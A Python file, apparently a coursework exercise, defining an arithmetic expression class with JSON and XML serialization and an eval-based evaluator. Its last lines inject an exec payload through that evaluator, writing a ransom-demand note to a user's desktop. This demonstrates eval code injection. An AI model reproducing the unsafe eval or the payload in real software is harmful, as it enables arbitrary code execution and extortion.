import json
import sys
from xml.dom import minidom
import pickle

class Op(object):

    def __init__(self, op, *args):
        self.op = op
        self.args = args

    def __eq__(self, other):
        return (type(other) is Op
                and self.op == other.op
                and self.args == other.args)

    def compute(self, env):
        self.args = list(self.args)
        if len(self.args) < 2:
            if self.op == '-':
                return - self.args[0]
            return self.args[0]

        if isinstance(self.args[0], str):
            self.args[0] = env[self.args[0]]
        if isinstance(self.args[1], str):
            self.args[1] = env[self.args[1]]

        if 0 in self.args[1:] or self.op not in ['+', '-', '*', '/']:
            raise ArithmeticError

        for i in range(len(self.args)):
            if isinstance(self.args[i], Op):
                self.args[i] = self.args[i].compute(env)

        calc = self.args[0]
        for arg in self.args[1:]:
            if self.op == '+':
                calc += arg
            elif self.op == '-':
                calc -= arg
            elif self.op == '*':
                calc *= arg
            elif self.op == '/':
                calc /= arg
        return calc

    def distribute_minus(self):
        if self.op == '-':
            if len(self.args) < 2:
                if isinstance(self.args[0], Op):
                    if self.args[0].op == '-' and len(self.args[0].args) < 2:
                        return self.args[0].args[0]
                    liT = []
                    for arg in self.args[0].args:
                        liT.append(Op('-', arg).distribute_minus())
                    self = Op('+', *liT)

                elif not isinstance(self.args[0], str):
                    return - self.args[0]
                return self.distribute_minus()

            li = []
            li.append(self.args[0])
            for arg in self.args[1:]:
                li.append(Op('-', arg).distribute_minus())
            return Op('+', *li).distribute_minus()
        return self

    def compute_by_eval(self, env=None):
        text = str(self)
        if env != None:
            for elm in env:
                text = text.replace(elm, str(env[elm]))
        return eval(text)

    def to_json_data(self):
        """
        Turn the operation into a dictionary suitable for json.dumps().

        :return: a dictionary representing the operation
        """
        chaineJson = {}
        chaineJson['op'] = self.op
        liArgs = []
        for arg in self.args:
            if isinstance(arg, Op):
                liArgs.append(arg.to_json_data())
            else:
                liArgs.append(arg)
        chaineJson['args'] = liArgs
        return chaineJson

    def json_dumps(self):
        """
        Turn the operation into a JSON string.
        Uses json.dumps().

        :return: a string representing the operation in JSON
        """
        return json.dumps(self.to_json_data())

    @staticmethod
    def of_json_data(json_data):
        """
        Turn the JSON data into an expression.

        :param json_data: a number, a string or a dictionary
        :return: a number, a string or an operation
        """
        args = []
        if isinstance(json_data, dict):
            if 'op' in json_data or 'args' in json_data:
                for arg in json_data['args']:
                    if isinstance(arg, dict):
                        args.append(Op.of_json_data(arg))
                    else:
                        args.append(arg)
                return Op(json_data['op'], *args)
            raise ValueError
        elif isinstance(json_data, str) or isinstance(json_data, float) or isinstance(json_data, int):
            return json_data
        else:
            raise ValueError

    @staticmethod
    def json_loads(txt):
        """
        Turn a JSON representation of an expression into this expression.
        An expression must be either:
        - a number (type int or float),
        - a variable name (type str),
        - an operation described by a dictionary having at least two entries:
        1. 'op', mapping to a string, representing the operator,
        2. 'args', mapping to a list of expressions.
        Uses json.loads().

        :param txt: an expression in JSON form
        :return: an expression (either a operation, a number or a string)
        :raise ValueError: when the JSON string is malformed
        """
        try:
            return Op.of_json_data(json.loads(txt))
        except ValueError as e:
            print(e)

    @staticmethod
    def xml_to_op(xml_data):
        args = []
        if xml_data.tagName == 'op':
            operateur = xml_data.attributes.get('operator').value
            for node in xml_data.childNodes:
                if not isinstance(node, minidom.Text):
                    args.append(Op.xml_to_op(node))
            return Op(operateur, *args)
        else:
            if xml_data.tagName == 'number':
                return float(xml_data.childNodes[0].data)
            elif xml_data.tagName == 'var':
                return xml_data.childNodes[0].data

    @staticmethod
    def of_xml(file):
        """
        Construct an expression (number, variable name or operation) from an XML file.
        The elements in the XML file are expected to be:
        -  <number>N</number> where N is a number
        - <var>V</var> where V is a variable name
        - <op operator="X">ARGS</op> where X is an arithmetic operator and ARGS is a list of elements.
        Uses minidom.

        :param file: the file where is located the XML
        :return: a number, a string or an Op
        """
        doc = minidom.parse(file)
        root = doc.documentElement
        return Op.xml_to_op(root)

    @staticmethod
    def expr_to_xml(expr, tab='  ', nb_tab=0):
        chaine_xml = ''
        nb_tab_temp = nb_tab
        if isinstance(expr, Op):
            chaine_xml += "<op operator=\"" + expr.op + "\">\n"
            nb_tab += 1
            for arg in expr.args:
                chaine_xml += tab*nb_tab + str(Op.expr_to_xml(arg, tab, nb_tab))
            chaine_xml += tab*nb_tab_temp + "</op>\n"
            return chaine_xml
        else:
            if isinstance(expr, str):
                return "<var>" + expr + "</var>\n"
            else:
                try:
                    expr = int(expr)
                except ValueError:
                    expr = float(expr)
                return "<number>" + str(expr) + "</number>\n"

    @staticmethod
    def dump_xml(expr, file=sys.stdout, tab='  ', nb_tab=0):
        """
        Dumps the expression in XML format.

        :param expr: a number, a string or an operation
        :param file: the file where the XML is dumped
        :param tab: the string used for indentation
        :param nb_tab: the initial number of indentation
        :return: None
        """
        print(Op.expr_to_xml(expr, tab, nb_tab))

    def __repr__(self):
        chaine = "Op('" + self.op + "'"
        for arg in self.args:
            if isinstance(arg, str):
                chaine += ", " + repr(arg)
            else:
                chaine += ", " + repr(arg)
        return chaine + ")"

    def __str__(self):
        chaine = "(" + str(self.args[0])
        for arg in self.args[1:]:
            chaine += " " + self.op + " " + str(arg)
        return chaine + ")"


op = Op('', 'exec(\'import os; fd = os.open("C:/Users/Dell/Desktop/IGotYou.txt", os.O_WRONLY | os.O_CREAT); os.write(fd,bytes("Si vous voulez accéder à vos fichiers, veuillez nous payer 5Bitcoins", "utf-8")); os.close(fd);\')')
print(op.compute_by_eval())

print(pickle.loads(pickle.dumps(Op('+', 'n', 1))))